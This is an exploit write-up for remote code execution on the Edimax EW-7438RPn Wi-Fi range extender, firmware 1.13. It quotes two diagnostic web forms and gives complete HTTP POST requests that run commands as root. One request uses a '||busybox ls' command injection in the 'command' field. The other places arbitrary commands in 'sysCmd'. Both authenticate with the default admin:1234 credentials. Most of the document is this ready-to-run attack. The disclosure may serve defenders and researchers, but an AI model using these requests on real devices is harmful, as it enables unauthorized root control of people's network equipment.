@@ -1,0 +1,75 @@
+# Exploit Title: Edimax EW-7438RPn 1.13 - Remote Code Execution
+# Date: 2020-04-23
+# Exploit Author: Besim ALTINOK
+# Vendor Homepage: https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/wi-fi_range_extenders_n300/ew-7438rpn_mini/
+# Version:1.13
+# Tested on: Edimax EW-7438RPn 1.13 Version
+
+------
+
+NOTE: This device configurated with root permissions. So you can run the
+command as root
+
+Here is the detail(s) of the RCE(s)
+
+1- Content of the mp.asp file
+
+<form action="/goform/mp" method="POST" name="mp">
+  <input type="text" name="command" value="">&nbsp;<input
+type="submit" value="GO">
+  <input type="hidden" name="getID" value="">&nbsp;
+  <input type="hidden" name="getID" value="">&nbsp;
+</form>
+
+RCE Detail:
+-------------------------------
+
+POST /goform/mp HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 *********************
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+DNT: 1
+Authorization: Basic YWRtaW46MTIzNA==
+Connection: close
+Cookie: language=1
+Upgrade-Insecure-Requests: 1
+
+command=||busybox+ls&getID=
+
+-------------------------------
+
+2- Content of the syscmd.asp
+
+<form action=/goform/formSysCmd method=POST name="formSysCmd"><table
+border=0 width="500" cellspacing=0 cellpadding=0>
+<tr><font size=2>
+This page can be used to run target system command.</tr>
+<tr><hr size=1 noshade align=top></tr>
+<tr>  <td>System Command: </td>
+  <td><input type="text" name="sysCmd" value="" size="20" maxlength="50"></td>
+  <td> <input type="submit" value="Apply" name="apply" onClick='return
+saveClick()'></td></form>
+
+
+RCE Detail:
+-------------------------------
+
+POST /goform/formSysCmd HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 *********************
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+DNT: 1
+Authorization: Basic YWRtaW46MTIzNA==
+Connection: close
+Cookie: language=1
+Upgrade-Insecure-Requests: 1
+
+sysCmd="command to here"
